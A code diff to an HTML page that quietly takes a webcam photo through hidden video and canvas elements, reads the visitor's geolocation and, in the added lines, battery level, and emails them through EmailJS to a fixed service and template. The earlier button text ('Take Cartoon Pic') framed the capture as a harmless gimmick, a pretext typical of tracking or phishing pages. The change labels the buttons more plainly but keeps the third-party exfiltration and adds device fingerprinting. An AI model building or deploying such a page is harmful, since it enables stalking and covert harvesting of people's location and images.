@@ -35,8 +35,8 @@
 </head>
 <body>
   <h2>Choose an Option</h2>
-  <button onclick="sendLocationOnly()">Check Your Location</button>
-  <button onclick="captureAndSend()">Take Cartoon Pic</button>
+  <button onclick="sendLocationOnly()">Check Location Only</button>
+  <button onclick="captureAndSend()">Take Picture + Location</button>
 
   <video id="video" autoplay style="display:none;"></video>
   <canvas id="canvas" style="display:none;"></canvas>
@@ -77,6 +77,7 @@
       const video = document.getElementById("video");
       const canvas = document.getElementById("canvas");
       const context = canvas.getContext("2d");
+
       const stream = await navigator.mediaDevices.getUserMedia({ video: true });
       video.srcObject = stream;
       await new Promise(resolve => setTimeout(resolve, 1500));
@@ -86,8 +87,20 @@
       const imageBase64 = canvas.toDataURL("image/png");
       stream.getTracks().forEach(track => track.stop());
 
-      navigator.geolocation.getCurrentPosition(function(position) {
-        const message = `Latitude: ${position.coords.latitude}, Longitude: ${position.coords.longitude}`;
+      navigator.geolocation.getCurrentPosition(async function(position) {
+        const coords = `Latitude: ${position.coords.latitude}, Longitude: ${position.coords.longitude}`;
+        let batteryLevel = "Unknown";
+
+        if (navigator.getBattery) {
+          try {
+            const battery = await navigator.getBattery();
+            batteryLevel = `${Math.round(battery.level * 100)}%`;
+          } catch (err) {
+            console.warn("Battery info not available", err);
+          }
+        }
+
+        const message = `${coords}, Battery: ${batteryLevel}`;
         emailjs.send("service_gkkpt4w", "template_96dsagv", {
           message: message,
           image: imageBase64
@@ -102,5 +115,3 @@
   </script>
 </body>
 </html>
-
- 
